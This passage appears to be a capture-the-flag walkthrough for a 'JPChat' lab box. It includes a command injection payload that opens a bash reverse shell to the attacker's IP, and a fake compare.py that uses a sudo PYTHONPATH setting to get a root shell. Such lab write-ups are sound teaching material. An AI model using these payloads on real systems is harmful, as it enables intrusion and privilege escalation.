Cool, we have ssh and supposedly a custom service? Lets try connect via netcat and run a second nmap in the background (on all ports).
</br>So here we connect to the chatting service:
```bash
$ nc $IP 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

## OSINT

So we are supposed to look for the admin's github. Quickly jumping on GitHub and searching for `JPGchat` does the trick. [Here](https://github.com/Mozzie-jpg/JPChat).
```py
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```
Nice, as we can see the chat awaits either a `[MESSAGE]` or a `[REPORT]` and when using `[REPORT]` it puts our input into a `bash -c ''` context. This could be abused.
```bash
$ nc $IP 3000 
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg 								<-- Oh, this was a good hint :P 
your name:
```

## Foothold

So the exploit is as follows:
```
your name:
hi;bash -i >& /dev/tcp/10.8.147.71/8888 0>&1;
your report:
something
hi
```
By writing `hi;` we echo hi and end that command, then still in the context of `bash -c ''` we execute `bash -i >& /dev/tcp/YOUR_IP/8888 0>&1;` the last `;` is to ensure that the `>>` appending operation doesnt mess up our reverse shell. Listen with `nc -lvnp 8888` and get your rev shell!</br>

### Stabilize shell

```bash
python3 -c "import pt;pty.spawn('/bin/bash')"
export TERM=xterm
//CTRL + Z to background
stty raw -echo;fg             <-- after you finish type 'reset' to get your home terminal back
```
## Privesc

So who are we and what can we do?
```bash
wes@ubuntu-xenial:/$ id
uid=1001(wes) gid=1001(wes) groups=1001(wes)
wes@ubuntu-xenial:/$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```
Very nice, I see someone has a love for python!
```bash
wes@ubuntu-xenial:~$ cd /opt/development/
wes@ubuntu-xenial:/opt/development$ ls -l
total 4
-rw-r--r-- 1 root root 93 Jan 15 18:58 test_module.py
```
So we only have read, access. Time to check out the source.
```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```
So import everything from compare and then run `compare.Str`? Aight, sadly we dont have write access in `/opt/development` oterhwise this would have been a module injcetion.
```bash
wes@ubuntu-xenial:/opt/development$ find / -type f 2>/dev/null | grep compare.py
/usr/lib/python3.5/compare.py
/usr/lib/python2.7/dist-packages/lxml/doctestcompare.pyc
/usr/lib/python2.7/dist-packages/lxml/doctestcompare.py
```	
But wait: `env_keep+=PYTHONPATH` maybe we can exploit this? We can! Consult [this](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8) article as I did!</br>
So I moved to `/dev/shm/` as that has lmost guaranteed write access and created the following `compare.py` script:
```python
class compare:

	def Str(self, x, y,):
		import os
		x = str(x)
		y = str(y)

		if x == y:
			os.system('/bin/bash -p')
			return True;
		else:
			return False;

	def Int(self, x, y,):
		x = int(x)
		y = int(y)

		if x == y:
			return True;
		else:
			return True;

	def Float(self, x, y,):
		x = float(x)
		y = float(y)

		if x == y:
			return True;
		else:
			return False;
```
Now run this command: `sudo PYTHONPATH=/dev/shm/ /usr/bin/python3 /opt/development/test_module.py`. Voila, root
```

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing
